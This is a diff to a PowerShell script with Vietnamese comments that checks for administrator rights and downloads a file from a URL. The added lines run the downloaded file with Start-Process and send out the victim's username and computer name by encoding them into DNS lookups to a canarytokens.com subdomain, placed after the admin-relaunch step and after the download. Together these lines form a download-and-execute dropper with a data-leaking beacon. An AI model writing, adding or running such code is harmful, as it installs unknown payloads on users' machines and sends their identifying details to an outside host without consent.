@@ -31,6 +31,9 @@ $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 $startupfolder = $env:appdata
 Add-Type -AssemblyName System.Windows.Forms
 
+$u = ("u$env:username" -replace '[^a-zA-Z0-9]','')[0..63] -join ''
+$c = ("c$env:computername" -replace '[^a-zA-Z0-9]','')[0..63] -join ''
+$id = -join (1..8 | % { [char[]] "abcdefhijklmnonpqrstuvwxyz0123456789" | Get-Random })
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -47,6 +50,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
         Write-Output "Kết thúc tiến trình PowerShell."
+        $id = "rerunadmin"
+        Resolve-DnsName "$c.UN.$u.CMD.$id.extbjjvko3xxued68eptp7zuk.canarytokens.com"
         Stop-Process -Id $PID -Force
     }
     catch {
@@ -83,9 +88,8 @@ if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process $output
+    $id = "blank"
+    Resolve-DnsName "$c.UN.$u.CMD.$id.extbjjvko3xxued68eptp7zuk.canarytokens.com"
 }
 
-$u = ("u$env:username" -replace '[^a-zA-Z0-9]','')[0..63] -join ''
-$c = ("c$env:computername" -replace '[^a-zA-Z0-9]','')[0..63] -join ''
-$id = -join (1..8 | % { [char[]] "abcdefhijklmnonpqrstuvwxyz0123456789" | Get-Random })
-Resolve-DnsName "$c.UN.$u.CMD.$id.extbjjvko3xxued68eptp7zuk.canarytokens.com"
